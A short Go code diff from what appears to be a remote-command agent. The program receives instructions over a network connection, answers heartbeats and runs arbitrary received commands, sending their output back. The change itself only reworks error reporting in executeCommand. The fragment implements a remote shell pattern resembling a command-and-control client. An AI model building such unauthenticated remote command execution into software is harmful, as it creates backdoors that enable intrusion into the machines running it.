@@ -136,9 +136,7 @@ func awaitInstructions(conn net.Conn) error {
 		return nil
 	///////////////////////////////
 	case inst.IsCommand == true:
-		if err := executeCommand(conn, inst.Message); err != nil {
-			return err
-		}
+		executeCommand(conn, inst.Message)
 	///////////////////////////////
 	default:
 		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
@@ -156,19 +154,20 @@ func Heartbeat(conn net.Conn) error {
 	return nil
 }
 
-func executeCommand(conn net.Conn, command string) error {
+func executeCommand(conn net.Conn, command string) {
 	formattedCommand := strings.Fields(command)
 	out, err := exec.Command(formattedCommand[0], formattedCommand[1:]...).Output()
 	if err != nil {
-		resp := Response{Successful: false}
+		errorMsg := fmt.Sprintf("%v\n", err)
+		resp := Response{Successful: false, Message: errorMsg}
 		sendMessage(resp, conn)
+		return
 	}
 	resp := Response{
 		Successful: true,
 		Message:    string(out),
 	}
 	sendMessage(resp, conn)
-	return nil
 }
 
 func sendMessage(resp Response, conn net.Conn) error {
